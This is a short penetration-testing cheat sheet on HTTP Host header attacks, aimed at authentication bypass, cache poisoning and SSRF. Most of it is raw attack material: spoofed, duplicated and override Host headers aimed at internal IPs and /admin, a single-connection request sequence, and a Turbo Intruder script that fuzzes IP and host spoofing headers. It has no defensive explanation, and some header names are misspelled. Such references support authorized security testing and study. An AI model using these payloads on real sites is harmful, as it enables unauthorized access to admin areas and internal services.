[#](#) Host Header

- Bypass Auth
- Cache Poisoning
- SSRF **Ensure to unchecked the auto-update host in intruder**

### Payloads

    GET /example HTTP/1.1
    Host: localost # get /admin
    
    GET /example HTTP/1.1
    Host: AAAA.vulnerable-website.com
    
    GET /example HTTP/1.1
    Host: legit.com
    Host: AAAA.com # test with .com and w/o
    
    GET /example HTTP/1.1
    Host: legit.com
     Host: AAAA.com
     
    GET https://legit.com/ HTTP/1.1
    Host: AAAA

    GET /example HTTP/1.1
    Host: legit.com
X-Forwarded-Host: AAAA
X-Host: AAAA
X-Forwarded-Server: AAAA
X-HTTP-Host-Override: AAAA
Forwarded: AAAA
    
    GET /example HTTP/1.1
    Host: 192.168.0.1/24 # (intruder)
    
    GET /example HTTP/1.1
    Host: collab.burp # (intruder)
    
    Send Group in Sequence (Single Connection)
    Request 1:
        GET / HTTP/1.1
        Host: legit.com
        Connection: keep-alive
    Request 2: 
        GET /admin HTTP/1.1
        Host: 192.168.0.1
        Connection: keep-alive

Turbo Intruder:

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    l = ["X-Originating-IP",
"X-Forwarded-For",
"X-Remote-IP",
"X-Remote-Addr",
"X-Client-IP",
"X-Host",
"X-Forwared-Host"]

    for h in l:
        engine.queue(target.req, [h, h])


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
```
